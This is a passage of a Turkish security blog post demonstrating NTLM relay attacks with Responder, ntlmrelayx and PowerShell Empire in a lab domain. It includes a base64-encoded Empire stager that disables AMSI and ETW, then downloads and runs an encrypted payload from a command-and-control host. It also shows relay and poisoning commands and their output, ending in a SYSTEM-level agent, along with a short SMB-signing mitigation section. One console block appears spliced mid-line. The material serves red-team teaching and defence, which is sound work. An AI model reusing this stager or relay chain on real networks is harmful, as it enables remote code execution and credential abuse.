JABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAQwBMAEkATgBNAFYAawB3AHQARAByAEgAUQBNAD0AOQBoADIAKwAzAGcAagBjADYATAB3AEkAZQBPAFkAeQAxADkAVwBWACsAZgBVADAAVgBPAEkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
INFO: Stager copied to clipboard 
</span></pre></td></tr></tbody></table></code></div></div>
<blockquote>
  <p>Oluşturulan encoded veri ntlmrelayxe verilir.</p>
</blockquote>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>ntlmrelayx.py <span class="nt">-smb2support</span> <span class="nt">-tf</span> relaylist <span class="nt">-c</span> <span class="s2">"powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABFAEEATwBRAEEANgBBAEQAawBBAE8AUQBBADUAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAFUARgBYADwARwA5AEAAKQBzAF0AbQB8AFYATQArAEgAXwB9AFIAcgAhAEkAdwA2ACYAaQBnAGsARAAtAD4ANAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAQwBMAEkATgBNAFYAawB3AHQARAByAEgAUQBNAD0AOQBoADIAKwAzAGcAagBjADYATAB3AEkAZQBPAFkAeQAxADkAVwBWACsAZgBVADAAVgBPAEkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=="</span>
<span class="go">Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.27
[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO FAILED
[*] SMBD-Thread-6 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.37
[*] Authenticating against smb://192.168.1.37 as OFFENSIVE/HELLO SUCCEED
[*] SMBD-Thread-6 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.27
[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO FAILED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-8 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left!
[*] SMBD-Thread-9 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left!
[*] SMBD-Thread-10 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left!
[*] Executed specified command on host: 192.168.1.37
[-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
</span></pre></td></tr></tbody></table></code></div></div>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="gp">(Empire: usestager/multi_launcher) &gt;</span><span class="w">
</span><span class="go">
[+] New agent Z5HM91KL checked in
</span><span class="gp">(Empire: agents) &gt;</span><span class="w"> </span>agents
<span class="go">
┌Agents────┬───────────┬────────────┬──────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬──────────┐
│ ID       │ Name      │ Language   │ Internal IP  │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener │
├──────────┼───────────┼────────────┼──────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤
│ Z5HM91KL │ Z5HM91KL* │ powershell │ 192.168.1.37 │ OFFENSIVE\SYSTEM │ powershell │ 4312 │ 5/0.0 │ 2023-07-11 16:18:37 EDT │ pwnypwny │
│          │           │            │              │                  │            │      │       │ (2 seconds ago)         │          │
└──────────┴───────────┴────────────┴──────────────┴──────────────────┴────────────┴──────┴───────┴─────────────────────────┴──────────┘
</span><span class="gp">(Empire: agents) &gt;</span><span class="w"> </span>interact Z5HM91KL
<span class="gp">(Empire: Z5HM91KL) &gt;</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">INFO: Tasked Z5HM91KL to run Task 1 
[*] Task 1 results received
NT AUTHORITY\SYSTEM
</span><span class="gp">(Empire: Z5HM91KL) &gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<h2 id="nasıl-önlenir"><span class="me-2">Nasıl önlenir?</span><a href="#nasıl-önlenir" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>SMB Signing aktif edilir.</p>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span>Get-SmbServerConfiguration | <span class="k">select </span>RequireSecuritySignature
<span class="go">
RequireSecuritySignature
------------------------
                   False


</span><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span>set-SmbServerConfiguration <span class="nt">-RequireSecuritySignature</span> <span class="nv">$TRUE</span> <span class="nt">-force</span>
<span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span>Get-SmbServerConfiguration | <span class="k">select </span>RequireSecuritySignature
<span class="go">
RequireSecuritySignature
------------------------
                    Tru     25
    Statically Configured DNS Servers:    192.168.1.50
    Register with which suffix:           Primary only
    Statically Configured WINS Servers:   Non

Configuration for interface "Loopback Pseudo-Interface 1"
    DHCP enabled:                         No
    IP Address:                           127.0.0.1
    Subnet Prefix:                        127.0.0.0/8 (mask 255.0.0.0)
    InterfaceMetric:                      75
    Statically Configured DNS Servers:    None
    Register with which suffix:           Primary only
    Statically Configured WINS Servers:   None
</span></pre></td></tr></tbody></table></code></div></div>
<blockquote>
  <p>Kontrol edelim</p>
</blockquote>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>crackmapexec smb 192.168.1.27                     
<span class="go">SMB         192.168.1.27    445    CLIENT2          [*] Windows 10.0 Build 22621 x64 (name:CLIENT2) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False)
</span></pre></td></tr></tbody></table></code></div></div>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>responder <span class="nt">-I</span> eth0 <span class="nt">-dwvF</span>
<span class="go">                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0

  To support this project:
</span><span class="gp">  Patreon -&gt;</span><span class="w"> </span>https://www.patreon.com/PythonResponder
<span class="gp">  Paypal  -&gt;</span><span class="w"> </span>https://paypal.me/PythonResponder
<span class="go">
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.40]
    Responder IPv6             [fe80::5acb:1933:215e:479f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-P5M72F80AIX]
    Responder Domain Name      [Q1G6.LOCAL]
    Responder DCE-RPC Port     [46965]

[+] Listening for events...                                                                                                                                                                                                                 

[*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...
[*] [NBT-NS] Poisoned answer sent to 192.168.1.37 for name OFFENSIVE (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 192.168.1.37 for name OFFENSIVE (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 192.168.1.37 for name OFFENSIVE (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 192.168.1.37 for name OFFENSIVE (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local
[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri
[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local
[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri
[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to 192.168.1.37    for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri
[*] [MDNS] Poisoned answer sent to fe80::6a22:3f3a:3c86:dc28 for name signing_denemeleri.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.37 for name signing_denemeleri
</span></pre></td></tr></tbody></table></code></div></div>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>ntlmrelayx.py <span class="nt">-t</span> smb://192.168.1.27 <span class="nt">-smb2support</span>                              
<span class="go">Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.1.27, attacking target smb://192.168.1.27
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
</span></pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw me-1"></i>
    
      <a href='/categories/internal/'>internal</a>,
      <a href='/categories/adsecurity/'>ADSecurity</a>,
      <a href='/categories/mitigate/'>mitigate</a>,
      <a href='/categories/attacks/'>attacks</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw me-1"></i>
      
      <a href="/tags/ntlmrelay/"
          class="post-tag no-text-decoration" >ntlmrelay</a>
      
      <a href="/tags/non-user/"
          class="post-tag no-text-decoration" >non-user</a>
      
      <a href="/tags/relay-based/"
          class="post-tag no-text-decoration" >relay-based</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      
    </div>

    <!-- Post sharing snippet -->

<div class="share-wrapper">
  <span class="share-label text-muted me-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
      <a
        href="https://twitter.com/intent/tweet?text=responder%20&%20ntlmrelay%20-%20Yugen&url=http%3A%2F%2F192.168.1.40%3A4000%2Fposts%2Fresponder-ve-ntlmrelay%2F"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Twitter"
        target="_blank"
        rel="noopener"
        aria-label="Twitter"
      >
        <i class="fa-fw fab fa-twitter"></i>
      </a>
    
      
      <a
        href="https://www.facebook.com/sharer/sharer.php?title=responder%20&%20ntlmrelay%20-%20Yugen&u=http%3A%2F%2F192.168.1.40%3A4000%2Fposts%2Fresponder-ve-ntlmrelay%2F"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Facebook"
        target="_blank"
        rel="noopener"
        aria-label="Facebook"
      >
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    
      
      <a
        href="https://t.me/share/url?url=http%3A%2F%2F192.168.1.40%3A4000%2Fposts%2Fresponder-ve-ntlmrelay%2F&text=responder%20&%20ntlmrelay%20-%20Yugen"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Telegram"
        target="_blank"
        rel="noopener"
        aria-label="Telegram"
      >
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <i
      id="copy-link"
      class="fa-fw fas fa-link small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
    </i>
  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
      
    </div>
  </div>
  <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
    <div class="access">
      <!-- Get the last 5 posts from lastmod list. -->















      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/movement/">movement</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/non-user/">non-user</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/execution/">execution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ntlmrelay/">ntlmrelay</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/relay-based/">relay-based</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/arp/">ARP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/dll/">dll</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/dns/">DNS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/pe/">PE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/spoof-based/">spoof-based</a>
      
    </div>
  </div>


    </div>

    
      
      

<!--

  <div id="toc-wrapper" class="ps-0 pe-4 mb-5">
    <div class="panel-heading ps-3 pt-2 mb-2">Contents</div>
    <nav id="toc"></nav>
  </div>

-->

    
  </div>
</div>

<!-- tail -->

  <div class="row">
    <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-3 pe-xl-4 mt-5">
      
        
        <!--
  Recommend the other 3 posts according to the tags and categories of the current post,
  if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->








  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  






<!-- Fill with the other newlest posts -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ms-1" data-toc-skip>
      Further Reading
    </h3>
    <div class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        
        
        <div class="col">
          <a href="/posts/mitm6-ve-ntlmrelay/" class="card post-preview h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em
  class="small"
  data-ts="1688936400"
  data-df="ll"
  
>
  Jul 10, 2023
</em>

              <h4 class="pt-0 my-2" data-toc-skip>mitm6 & ntlmrelay</h4>
              <div class="text-muted small">
                <p>
                  





